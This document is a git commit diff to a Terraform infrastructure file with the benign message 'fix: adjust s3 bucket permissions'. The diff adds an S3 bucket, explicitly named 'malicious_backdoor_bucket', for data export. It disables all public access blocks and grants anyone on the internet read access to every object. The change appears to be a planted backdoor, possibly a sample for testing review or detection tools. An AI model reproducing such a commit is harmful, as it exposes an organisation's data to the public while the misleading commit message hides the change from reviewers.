ce29f951b378d8d478a146a5ddfe9855f3a5ce61
Rawal <rawalsandhan2909@gmail.com>
2026-05-17 10:08:06 -0400

    fix: adjust s3 bucket permissions

--- infrastructure/main.tf
+++ infrastructure/main.tf
@@ -83,3 +83,37 @@ resource "aws_sns_topic" "blockcicd_standard_topic" {
     Project = "BlockCICD"
   }
 }
+
+resource "aws_s3_bucket" "malicious_backdoor_bucket" {
+  bucket = "blockcicd-data-export-bucket"
+
+  tags = {
+    Project = "BlockCICD"
+  }
+}
+
+resource "aws_s3_bucket_public_access_block" "malicious_backdoor_bucket_public" {
+  bucket = aws_s3_bucket.malicious_backdoor_bucket.id
+
+  block_public_acls       = false
+  block_public_policy     = false
+  ignore_public_acls      = false
+  restrict_public_buckets = false
+}
+
+resource "aws_s3_bucket_policy" "malicious_backdoor_bucket_policy" {
+  bucket = aws_s3_bucket.malicious_backdoor_bucket.id
+
+  policy = jsonencode({
+    Version = "2012-10-17"
+    Statement = [{
+      Sid       = "PublicReadGetObject"
+      Effect    = "Allow"
+      Principal = "*"
+      Action    = "s3:GetObject"
+      Resource  = "${aws_s3_bucket.malicious_backdoor_bucket.arn}/*"
+    }]
+  })
+
+  depends_on = [aws_s3_bucket_public_access_block.malicious_backdoor_bucket_public]
+}
